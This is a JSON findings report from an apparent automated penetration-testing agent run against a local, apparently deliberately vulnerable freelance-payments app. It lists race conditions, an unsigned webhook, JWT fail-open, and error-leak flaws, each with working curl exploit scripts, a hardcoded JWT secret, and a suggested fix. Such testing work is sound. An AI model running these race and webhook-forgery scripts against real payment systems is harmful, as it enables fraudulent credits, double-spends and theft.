@@ -1,0 +1,289 @@
+{
+  "agent": "a10-exceptional-conditions",
+  "target": "http://localhost:3000",
+  "findings": [
+    {
+      "id": "a10-f01",
+      "title": "TOCTOU race condition: double-withdraw drains wallet to negative balance",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-362",
+      "location": {
+        "file": "src/payments/payments.service.js",
+        "line": 79,
+        "endpoint": "POST /api/payments/wallet/withdraw"
+      },
+      "description": "The withdraw function performs a balance check (line 86: `wallet.balance < amount`) and then the balance update (line 90: `db('wallets').where({id}).update(...)`) as two separate, non-atomic statements with no row-level lock, no transaction, and no optimistic concurrency check. Twenty concurrent POST requests each for the full balance resulted in TWO successful withdrawals, driving the wallet balance from 100000 to -100000 cents. The window is wide because both the balance fetch and balance update are awaited sequentially, giving concurrent requests time to pass the check before any update commits.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\nfor i in $(seq 1 20); do\n  (curl -s -o /tmp/wd_${i}.json -w \"HTTP:%{http_code} attempt:${i}\\n\" -X POST \\\n    -H \"Authorization: Bearer $CLIENT\" \\\n    -H \"Content-Type: application/json\" \\\n    -d '{\"amount\": 1000}' \\\n    http://localhost:3000/api/payments/wallet/withdraw &)\ndone\nwait\ncurl -s -H \"Authorization: Bearer $CLIENT\" http://localhost:3000/api/payments/wallet",
+        "response_snippet": "Attempts 1 and 2 returned HTTP 200 with balance=0. Final wallet balance: -100000 (started at 100000). Two successful withdrawals of the full balance.",
+        "code_snippet": "// payments.service.js:79-109 — no transaction wrapper\nconst wallet = await getWallet(userId); // SELECT\nif (wallet.balance < amount) { throw ... } // CHECK\nconst [updated] = await db('wallets').where({id:wallet.id}).update({balance: db.raw('balance - ?', [amount])}).returning('*'); // UPDATE"
+      },
+      "reproduction_steps": [
+        "Deposit $1000 (100000 cents) into the client wallet",
+        "Fire 20 concurrent POST /api/payments/wallet/withdraw with amount=1000 ($1000)",
+        "Observe that 2+ requests succeed (HTTP 200) despite only one having sufficient funds",
+        "Verify final wallet balance is -100000 (double-spent)"
+      ],
+      "impact": "Any user can overdraw their wallet to an arbitrarily negative balance by racing concurrent withdraw requests. This constitutes a double-spend that drains funds the user never had, potentially triggering real payouts or further downstream financial operations using the negative balance.",
+      "suggested_fix": "Wrap the entire balance check + update in a database transaction with a SELECT FOR UPDATE or use an atomic UPDATE WHERE balance >= amount and check rows affected.",
+      "needs_poc": true
+    },
+    {
+      "id": "a10-f02",
+      "title": "TOCTOU race condition: escrow release executes multiple times on same milestone",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-362",
+      "location": {
+        "file": "src/payments/payments.service.js",
+        "line": 204,
+        "endpoint": "POST /api/payments/escrow/release/:milestoneId"
+      },
+      "description": "The releaseEscrow function reads milestone.status (line 211: `milestone.status !== 'approved'`) and later marks it released (line 286) as separate non-atomic operations. The status is written at the end of the function rather than at the beginning with a lock. Twenty concurrent release requests on a single approved milestone resulted in SIX successful executions: the freelancer received 63000 cents (6 × 9000) instead of 9000, and the client's pending_balance went to -60000 (6 × 10000 deducted). Three separate wallet UPDATE statements (deduct client pending, credit freelancer, record fee) are also each separate non-transactional calls.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\nMILESTONE_ID=\"67e606ee-bd1f-489d-8bdd-ff6166c1233d\"\nfor i in $(seq 1 20); do\n  (curl -s -o /tmp/er_${i}.json -w \"HTTP:%{http_code} attempt:${i}\\n\" -X POST \\\n    -H \"Authorization: Bearer $CLIENT\" \\\n    -H \"Content-Type: application/json\" \\\n    http://localhost:3000/api/payments/escrow/release/${MILESTONE_ID} &)\ndone\nwait\ncurl -s -H \"Authorization: Bearer $FREELANCER\" http://localhost:3000/api/payments/wallet",
+        "response_snippet": "6 of 20 requests returned HTTP 200 with payout=9000. Freelancer wallet: balance=63000 (expected 9000). Client pending_balance=-60000. 6 escrow_fund transactions at the same timestamp confirming 6 concurrent executions.",
+        "code_snippet": "// No transaction around the 5 sequential DB operations:\nawait db('wallets').where({id:clientWallet.id}).update({pending_balance: db.raw('pending_balance - ?', [amount])});\nawait db('wallets').where({id:freelancerWallet.id}).update({balance: db.raw('balance + ?', [freelancerPayout])});\nawait db('transactions').insert({...});\nawait db('transactions').insert({...fee...});\nawait db('milestones').where({id:milestoneId}).update({status:'released'});"
+      },
+      "reproduction_steps": [
+        "Create a contract with a milestone, fund escrow, submit and approve the milestone",
+        "Fire 20 concurrent POST /api/payments/escrow/release/:milestoneId requests",
+        "Observe 2-7 requests succeed (HTTP 200) and freelancer receives multiple payouts",
+        "Verify transaction log shows duplicate escrow_release entries at the same timestamp"
+      ],
+      "impact": "A client or cooperating freelancer can multiply payouts from a single escrow by racing the release endpoint. The freelancer receives N times the milestone amount, and the client's pending_balance goes deeply negative, creating phantom liability.",
+      "suggested_fix": "Wrap all wallet and milestone updates in a single database transaction. Use an atomic UPDATE WHERE status='approved' returning the affected row count — if 0 rows updated, the race was lost and no further operations should proceed.",
+      "needs_poc": true
+    },
+    {
+      "id": "a10-f03",
+      "title": "TOCTOU race condition: escrow fund executes multiple times on same pending milestone",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-362",
+      "location": {
+        "file": "src/payments/payments.service.js",
+        "line": 116,
+        "endpoint": "POST /api/payments/escrow/fund/:milestoneId"
+      },
+      "description": "The fundEscrow function reads milestone.status === 'pending' then performs balance deduction, transaction insertion, and milestone status update as four separate non-atomic statements. Twenty concurrent fund requests on a single pending milestone resulted in FIVE successful executions: 500 cents deducted instead of 100 (5 × 100 cents), and 6 escrow_fund transaction records were created for the same milestone_id at the same timestamp. The milestone status check at the top is not protected by a row lock, allowing multiple requests to observe 'pending' before any of them marks it 'funded'.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\nMILESTONE_ID=\"e5a5145d-ad7c-465a-b1c1-c65d0b2c278d\"\nfor i in $(seq 1 20); do\n  (curl -s -o /tmp/fe_${i}.json -w \"HTTP:%{http_code} attempt:${i}\\n\" -X POST \\\n    -H \"Authorization: Bearer $CLIENT\" \\\n    -H \"Content-Type: application/json\" \\\n    http://localhost:3000/api/payments/escrow/fund/${MILESTONE_ID} &)\ndone\nwait",
+        "response_snippet": "5 of 20 requests returned HTTP 200. 6 escrow_fund transactions recorded at 2026-04-14T15:12:11. Client balance decreased by 600 cents (expected 100 cents for one funding).",
+        "code_snippet": "// Non-atomic check-then-act:\nconst milestone = await db('milestones').where({id:milestoneId}).first(); // READ STATUS\nif (milestone.status !== 'pending') { throw ... }                         // CHECK\nawait db('wallets').where({id:wallet.id}).update({balance: db.raw('balance - ?', [amount])...}); // DEDUCT\nawait db('milestones').where({id:milestoneId}).update({status:'funded'...}); // MARK (too late)"
+      },
+      "reproduction_steps": [
+        "Obtain a milestone in 'pending' status with associated contract where you are the client",
+        "Ensure client wallet has sufficient balance for the milestone amount",
+        "Fire 20+ concurrent POST /api/payments/escrow/fund/:milestoneId",
+        "Observe multiple 200 responses and duplicate escrow_fund transactions"
+      ],
+      "impact": "The client can be overcharged by N times the milestone amount (N = number of concurrent winning requests). The milestone ends up 'funded' multiple times in the transaction log, corrupting the financial state.",
+      "suggested_fix": "Use an atomic UPDATE WHERE status='pending' RETURNING * and check that exactly one row was updated before proceeding with wallet deduction. Wrap in a transaction.",
+      "needs_poc": false
+    },
+    {
+      "id": "a10-f04",
+      "title": "Unauthenticated payment webhook credits arbitrary user wallets without signature",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-306",
+      "location": {
+        "file": "src/integrations/webhook.service.js",
+        "line": 18,
+        "endpoint": "POST /api/webhooks/payment"
+      },
+      "description": "The payment webhook handler at POST /api/webhooks/payment has no authentication middleware (documented as 'no auth required since it comes from payment provider'). The signature validation at line 18-29 is CONDITIONAL: it only verifies the HMAC if the `x-payment-signature` header is PRESENT. If the header is omitted entirely, the signature block is skipped and the event is processed unconditionally. Any unauthenticated attacker can POST a `payment.completed` event targeting any user_id to credit that user's wallet with arbitrary amounts.",
+      "evidence": {
+        "request": "# Credit target user with 999999 cents (no auth, no signature header required)\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"event\":\"payment.completed\",\"data\":{\"user_id\":\"aa154850-6352-4ec8-b288-d398e7cd62ad\",\"amount\":999999,\"reference_id\":\"00000000-0000-0000-0000-000000001234\",\"description\":\"Unauthorized credit\"}}' \\\n  http://localhost:3000/api/webhooks/payment",
+        "response_snippet": "{\"received\":true,\"result\":{\"processed\":true,\"event\":\"payment.completed\"}}  HTTP 200. Admin user (bob) wallet balance changed from 0 to 999999 cents.",
+        "code_snippet": "const signature = headers['x-payment-signature'];\nif (signature) { // <-- ONLY validates if header is present!\n  // ... HMAC check ...\n}\n// Falls through and processes event if no signature header sent"
+      },
+      "reproduction_steps": [
+        "Send POST /api/webhooks/payment with no Authorization header and no x-payment-signature header",
+        "Body: {\"event\":\"payment.completed\",\"data\":{\"user_id\":\"<any-user-uuid>\",\"amount\":99999999,\"reference_id\":\"<valid-uuid>\",\"description\":\"hack\"}}",
+        "Observe HTTP 200 and wallet balance of target user increases by specified amount",
+        "Any user_id in the system can be targeted"
+      ],
+      "impact": "Any unauthenticated attacker can grant any user an arbitrary wallet balance. This effectively allows self-enrichment, targeted enrichment of accomplices, or inflation of any account balance to facilitate subsequent withdrawals or escrow manipulation.",
+      "suggested_fix": "Make signature verification mandatory (not conditional): remove the `if (signature)` check and always verify. Additionally, implement idempotency keys (reference_id uniqueness check) to prevent replay of the same webhook event.",
+      "needs_poc": true
+    },
+    {
+      "id": "a10-f05",
+      "title": "Auth middleware fail-open on JWT NotBeforeError (unexpected exception path calls next())",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-755",
+      "location": {
+        "file": "src/middleware/auth.js",
+        "line": 36,
+        "endpoint": "All routes using authenticate middleware"
+      },
+      "description": "The authenticate middleware's JWT catch block (lines 31-37) explicitly handles only `JsonWebTokenError` and `TokenExpiredError` by name. Any other error type causes `return next()` to be called with req.user unset (line 36). In jsonwebtoken v9 (installed version), a token with a future `nbf` (not-before) claim throws `NotBeforeError` with `err.name === 'NotBeforeError'` — which does NOT match either handled name. The middleware therefore calls next() with no req.user, and downstream controllers crash with `TypeError: Cannot read properties of undefined (reading 'id')`, returning a 500 with a full Node.js stack trace. The stack trace explicitly confirms the call chain: `at authenticate (/app/src/middleware/auth.js:36:14)`. A properly-signed (with the actual JWT secret) token with a far-future nbf triggers this path reliably.",
+      "evidence": {
+        "request": "# Generate NBF token inside docker (needs actual JWT secret from container env):\n# docker exec webvulnbench-app-1 node -e \"\n# const jwt=require('jsonwebtoken');\n# const t=jwt.sign({id:'ec83b101-7215-4ad3-962c-18dc6d6c4c54',role:'client'},'hireflow-jwt-secret-2024',{notBefore:'10y',expiresIn:'10y'});\n# console.log(t);\"\n\n# Then use that token:\ncurl -s -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVjODNiMTAxLTcyMTUtNGFkMy05NjJjLTE4ZGM2ZDZjNGM1NCIsImVtYWlsIjoicGVudGVzdGVyX2NsaWVudF8xQHRlc3QuY29tIiwicm9sZSI6ImNsaWVudCIsImlhdCI6MTc3NjE3OTQzOSwibmJmIjoyMDkxNzU1NDM5LCJleHAiOjIwOTE3NTU0Mzl9.utcpZ9ZPoEzMDRRvhkAbwbkhIg2RHSlqiflIjr6H25k\" \\\n  http://localhost:3000/api/payments/wallet",
+        "response_snippet": "{\"error\":\"Cannot read properties of undefined (reading 'id')\",\"stack\":\"TypeError: Cannot read properties of undefined (reading 'id')\\n    at exports.getWallet (/app/src/payments/payments.controller.js:5:61)\\n    ...\\n    at authenticate (/app/src/middleware/auth.js:36:14)\"}  HTTP 500",
+        "code_snippet": "} catch (err) {\n  if (err.name === 'JsonWebTokenError' || err.name === 'TokenExpiredError') {\n    return res.status(401).json({ error: 'Invalid or expired token' });\n  }\n  // unexpected errors shouldn't block the request pipeline\n  return next(); // <-- fail-open: req.user is undefined\n}"
+      },
+      "reproduction_steps": [
+        "Extract the actual JWT_SECRET from the container: docker exec webvulnbench-app-1 node -e \"console.log(require('/app/src/config').jwt.secret)\"",
+        "Generate a valid HS256 JWT with notBefore set 10 years in future using that secret",
+        "Send the token as Authorization: Bearer on any authenticated endpoint",
+        "Observe HTTP 500 with full TypeError stack trace instead of HTTP 401"
+      ],
+      "impact": "Currently manifests as a DoS (server-error + stack trace leak) rather than a full auth bypass, because downstream controllers crash immediately on req.user.id. However, any route handler that gracefully checks `if (req.user)` before accessing it would silently pass the middleware without authentication. The stack trace disclosure reveals internal file paths and controller structure. With the JWT secret known (it's in source), this can be weaponized trivially.",
+      "suggested_fix": "Change the catch block to return 401 for ALL JWT-related errors: `catch (err) { return res.status(401).json({ error: 'Invalid or expired token' }); }`. Never call next() from the authenticate catch block.",
+      "needs_poc": false
+    },
+    {
+      "id": "a10-f06",
+      "title": "No upper bound on deposit amount: wallet balance can be inflated to near bigint max",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-190",
+      "location": {
+        "file": "src/payments/payments.controller.js",
+        "line": 16,
+        "endpoint": "POST /api/payments/wallet/deposit"
+      },
+      "description": "The deposit controller validates `amount > 0` but imposes no maximum. The `parseFloat(amount) * 100` conversion accepts scientific notation (e.g., `9.2e16`). Deposits of 2147483648 ($21M), 9.2e16 ($920 trillion), and other astronomically large values all succeed, setting the wallet balance to values like 9223371015021479100 (near PostgreSQL bigint max of 9223372036854775807). Sending `1e308` causes a PostgreSQL error `invalid input syntax for type bigint: \"Infinity\"` which is returned verbatim to the client in a 500 response, leaking the SQL query structure.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\n# Inflate balance to near bigint max:\ncurl -s -X POST -H \"Authorization: Bearer $CLIENT\" -H \"Content-Type: application/json\" \\\n  -d '{\"amount\": 9.2e16}' http://localhost:3000/api/payments/wallet/deposit",
+        "response_snippet": "HTTP 200: {\"wallet\":{\"balance\":\"9200011000021479100\",...}}  (starting from 11000021479100, added 9.2e18 cents)",
+        "code_snippet": "const cents = Math.round(parseFloat(amount) * 100); // no max check\n// e.g. parseFloat('9.2e16') * 100 = 9.2e18 — passes service check amount > 0"
+      },
+      "reproduction_steps": [
+        "Authenticate as any user",
+        "POST /api/payments/wallet/deposit with {\"amount\": 9.2e16}",
+        "Observe 200 response with wallet balance near 9.2e18 cents",
+        "Send a further deposit of 1e308 to trigger SQL error leak: {\"error\":\"... invalid input syntax for type bigint: \\\"Infinity\\\"\",\"stack\":\"...\"}"
+      ],
+      "impact": "An attacker can grant themselves near-unlimited wallet balance and then withdraw real funds or fund escrow for contracts. The SQL error path also leaks internal query structure and PostgreSQL error messages.",
+      "suggested_fix": "Add a maximum deposit amount validation (e.g., max $1M per transaction). Add NaN/Infinity guards: `if (!isFinite(cents) || cents > MAX_DEPOSIT) { return 400 }`. Use parameterized amounts in cents from the start rather than floating-point multiplication.",
+      "needs_poc": false
+    },
+    {
+      "id": "a10-f07",
+      "title": "Unbounded file upload: no size limit on message attachments or contract deliverables",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-400",
+      "location": {
+        "file": "src/middleware/upload.js",
+        "line": 50,
+        "endpoint": "POST /api/messages/conversations/:id/messages, POST /api/contracts/:id/milestones/:mid/submit"
+      },
+      "description": "The `upload` multer instance (used for message attachments, up to 5 files) and `deliverableUpload` multer instance (used for contract deliverable submissions, up to 10 files) are configured with NO `limits.fileSize`. A single 50MB binary file uploaded as a message attachment was accepted (HTTP 201), stored to disk, and returned in the response body with its full server path (`/uploads/<uuid>.bin`). The express.json 10MB limit does not apply to multipart uploads.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\ndd if=/dev/zero bs=1M count=50 2>/dev/null | tr '\\0' 'A' > /tmp/bigfile.bin\ncurl -s -H \"Authorization: Bearer $CLIENT\" \\\n  -F \"content=test\" \\\n  -F \"attachments=@/tmp/bigfile.bin;type=application/octet-stream\" \\\n  http://localhost:3000/api/messages/conversations/0d3d1c93-bfde-4617-bc38-c740e927effd/messages",
+        "response_snippet": "HTTP 201: {\"attachments\":[{\"path\":\"/uploads/2885defd-3bfd-495a-b607-5c90689abaf8.bin\",\"size\":52428800,\"filename\":\"bigfile.bin\",\"mimetype\":\"application/octet-stream\"}]}",
+        "code_snippet": "const deliverableUpload = multer({\n  storage\n  // no limits: {} at all\n});"
+      },
+      "reproduction_steps": [
+        "Create a large file: dd if=/dev/zero bs=1M count=50 of=/tmp/bigfile.bin",
+        "POST to any message conversation with -F attachments=@/tmp/bigfile.bin",
+        "Observe HTTP 201 with file saved to server disk"
+      ],
+      "impact": "Authenticated users can fill server disk storage. Combined with the publicly accessible /uploads directory listing, files are also trivially downloadable. 10 concurrent deliverable uploads of 100MB each = 1GB disk use per request wave.",
+      "suggested_fix": "Add `limits: { fileSize: 10 * 1024 * 1024 }` (10MB) to both `upload` and `deliverableUpload` multer instances. Consider per-user upload quotas.",
+      "needs_poc": false
+    },
+    {
+      "id": "a10-f08",
+      "title": "SQL error leaked in HTTP 500 responses including full query text and stack trace",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-209",
+      "location": {
+        "file": "src/middleware/errorHandler.js",
+        "line": 31,
+        "endpoint": "Multiple endpoints (e.g., GET /api/payments/transactions?limit=-1)"
+      },
+      "description": "The global error handler includes `response.stack = err.stack` when `NODE_ENV !== 'Production'` (note the capital P — this is a case-sensitive comparison; the env var is typically `production` in lowercase, so this check effectively always includes the stack in production too). Database errors from PostgreSQL (pg driver) have their full error message (including the raw SQL query text) in `err.message`, which is included in the response body. Sending `?limit=-1` to the transactions endpoint returns the full Knex-generated SQL query with parameter placeholders and the PostgreSQL error.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\ncurl -s -H \"Authorization: Bearer $CLIENT\" \"http://localhost:3000/api/payments/transactions?limit=-1\"",
+        "response_snippet": "{\"error\":\"select * from \\\"transactions\\\" where \\\"wallet_id\\\" = $1 order by \\\"created_at\\\" desc limit $2 - LIMIT must not be negative\",\"stack\":\"error: select * from \\\"transactions\\\"...\\n    at parseErrorMessage (/app/node_modules/pg-protocol/dist/parser.js:305:11)...\"}  HTTP 500",
+        "code_snippet": "// errorHandler.js:35\nif (process.env.NODE_ENV !== 'Production') { // Capital P -- never matches 'production'\n  response.stack = err.stack;\n}\n// err.message for pg errors contains full SQL: \"select * from ... - LIMIT must not be negative\""
+      },
+      "reproduction_steps": [
+        "GET /api/payments/transactions?limit=-1 (authenticated)",
+        "Observe 500 with full SQL query, table name, column names, and Node.js stack trace",
+        "Also triggered by: POST /api/payments/wallet/deposit with amount=1e308 (Infinity bigint error)"
+      ],
+      "impact": "SQL query structure and table/column names leaked. Node.js stack trace reveals file paths inside the container. Aids SAST/injection attacks by revealing query structure.",
+      "suggested_fix": "Fix the case-sensitive comparison: `process.env.NODE_ENV !== 'production'` (lowercase). Also sanitize pg error messages before returning — never include raw SQL in API responses.",
+      "needs_poc": false
+    },
+    {
+      "id": "a10-f09",
+      "title": "Integer parsing of UUID IDs via parseInt() truncates UUIDs to leading digits",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-704",
+      "location": {
+        "file": "src/proposals/proposals.controller.js",
+        "line": 88,
+        "endpoint": "PUT /api/proposals/:id, PUT /api/proposals/:id/status, DELETE /api/proposals/:id"
+      },
+      "description": "The proposals controller uses `parseInt(req.params.id)` on UUID-format proposal IDs (e.g., `09bd3e44-7587-4ec7-b973-aac337f3583d`). `parseInt` parses until it encounters a non-numeric character, producing `9` for `09bd3e44-...` (strips leading zero, reads up to the `-`). IDs starting with letters like `dae13aa8-...` yield `NaN` and return `400 Invalid proposal ID`. IDs starting with digits yield a wrong integer ID that matches a completely different row (or no row). This means proposal operations silently target wrong resources, and error responses include the truncated integer in the SQL error message, leaking the partial ID.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\ncurl -s -X PUT -H \"Authorization: Bearer $CLIENT\" -H \"Content-Type: application/json\" \\\n  -d '{\"status\":\"accepted\"}' \\\n  \"http://localhost:3000/api/proposals/09bd3e44-7587-4ec7-b973-aac337f3583d/status\"",
+        "response_snippet": "{\"error\":\"select * from \\\"proposals\\\" where \\\"id\\\" = $1 limit $2 - invalid input syntax for type uuid: \\\"9\\\"\",\"stack\":\"...\"}  HTTP 500\n\n// parseInt('09bd3e44-...') = 9 (leading 0 stripped, stops at '-')\n// parseInt('dae13aa8-...') = NaN -> 400 Invalid proposal ID",
+        "code_snippet": "var proposalId = parseInt(req.params.id); // WRONG: UUID is not an integer\nif (isNaN(proposalId)) {\n  return res.status(400).json({ error: 'Invalid proposal ID' });\n}\nvar existing = await proposalService.getProposalById(proposalId); // queries with integer, not UUID"
+      },
+      "reproduction_steps": [
+        "GET /api/proposals to obtain a proposal UUID like 09bd3e44-7587-4ec7-b973-aac337f3583d",
+        "PUT /api/proposals/09bd3e44-7587-4ec7-b973-aac337f3583d/status with {\"status\":\"accepted\"}",
+        "Observe 500 with error showing the truncated value '9' was sent to PostgreSQL as UUID"
+      ],
+      "impact": "All proposal mutation endpoints (update, changeStatus, withdraw) are broken for numeric-leading UUID proposal IDs. Effectively a denial of service on those proposals. Also triggers SQL error disclosure.",
+      "suggested_fix": "Remove parseInt() and pass the raw UUID string: `var proposalId = req.params.id;`. Add UUID format validation using a regex or library if needed.",
+      "needs_poc": false
+    },
+    {
+      "id": "a10-f10",
+      "title": "Array type accepted as numeric deposit amount (type confusion in payment controller)",
+      "severity": "low",
+      "confidence": "confirmed",
+      "category": "A10",
+      "cwe": "CWE-704",
+      "location": {
+        "file": "src/payments/payments.controller.js",
+        "line": 16,
+        "endpoint": "POST /api/payments/wallet/deposit, POST /api/payments/wallet/withdraw"
+      },
+      "description": "The deposit and withdraw controllers check `if (!amount || amount <= 0)` before calling `parseFloat(amount) * 100`. Sending `{\"amount\":[\"1000\"]}` passes the check (`[\"1000\"]` is truthy and `[\"1000\"] <= 0` is false), and `parseFloat([\"1000\"]) = 1000` coerces the array to its string representation. The deposit with an array amount succeeds with HTTP 200 and credits 100000 cents. Additionally, sending `{\"amount\":{\"toString\":\"999\"}}` and `{\"amount\":true}` cause 500 errors that leak partial SQL query text.",
+      "evidence": {
+        "request": "source /tmp/tokens.env\ncurl -s -X POST -H \"Authorization: Bearer $CLIENT\" -H \"Content-Type: application/json\" \\\n  -d '{\"amount\":[\"1000\"]}' http://localhost:3000/api/payments/wallet/deposit",
+        "response_snippet": "HTTP 200: {\"wallet\":{\"balance\":\"...100000 more cents than before\",...}}",
+        "code_snippet": "if (!amount || amount <= 0) { return 400; } // [\"1000\"] passes this check\nconst cents = Math.round(parseFloat(amount) * 100); // parseFloat([\"1000\"]) = 1000"
+      },
+      "reproduction_steps": [
+        "POST /api/payments/wallet/deposit with {\"amount\":[\"1000\"]}",
+        "Observe HTTP 200 deposit of 100000 cents (equivalent to string '1000' parsed)"
+      ],
+      "impact": "Minor functional issue - array amount behaves identically to string amount in most cases. The more significant concern is the inconsistency: the controller accepts non-number types for a financial field, and object types like {$ne:null} cause 500 errors that reveal SQL internals.",
+      "suggested_fix": "Use strict numeric validation: `const amount = Number(req.body.amount); if (!Number.isFinite(amount) || amount <= 0) { return 400; }`",
+      "needs_poc": false
+    }
+  ],
+  "coverage_notes": "Tested all four money-flow endpoints for TOCTOU races (withdraw, deposit, fundEscrow, releaseEscrow). Ran 20-concurrent-request race tests. Confirmed wallet balances go negative (withdraw: -100000) and to massive multiples (escrow release: 6x payout). Tested auth fail-open for NotBeforeError (confirmed, leads to 500 + stack trace, not silent bypass). Tested webhook signature bypass (confirmed, credits arbitrary users). Tested boundary values 0/-1/NaN/Infinity/1e308/large integers on deposit and withdraw. Tested type confusion (array, object, boolean). Tested unbounded pagination (limit=999999 accepted, limit=-1 causes SQL error). Confirmed 50MB file upload succeeds with no size restriction. Did NOT test: PDF invoice generation for concurrent Puppeteer DoS (no invoice endpoint found in time budget); link-preview/import-profile SSRF (noted but out of scope for A10); session fixation via dual-auth (noted for A07).",
+  "blind_spots": [
+    "Puppeteer PDF generation concurrent load test (GET /api/contracts/:id/invoice) — could pin workers",
+    "Link-preview SSRF timing attack via slow response URL to pin event loop (overlap with A07/A10)",
+    "Deposit race with concurrent deposits + withdraw at same time (triple-race)",
+    "Admin webhook replay (payment.refunded to drain real balances) — needs valid reference_id from prior transaction",
+    "Proposal accept race via concurrent acceptances on same project by two clients simultaneously"
+  ]
+}
